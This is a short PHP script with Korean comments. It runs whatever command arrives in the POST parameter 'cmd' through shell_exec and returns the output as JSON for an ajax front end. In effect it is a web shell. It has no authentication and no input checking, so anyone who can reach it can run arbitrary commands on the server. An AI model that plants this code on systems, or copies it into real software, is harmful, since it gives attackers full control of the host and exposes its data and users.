<?php
$ret = [];
$ret["result"] = "";
// ajax가 POST형식으로 요청이 오면 명령어를 실행한다.
if ($_SERVER["REQUEST_METHOD"] == "POST") {
$data = shell_exec($_POST["cmd"]);
$data = mb_convert_encoding($data, "UTF-8", "euc-kr");
// 결과를 $ret변수의 result키로 값을 넣는다.
$ret["result"] = htmlspecialchars($data);
}
// json형식으로 변환한다.
?>
<?=json_encode($ret)?>
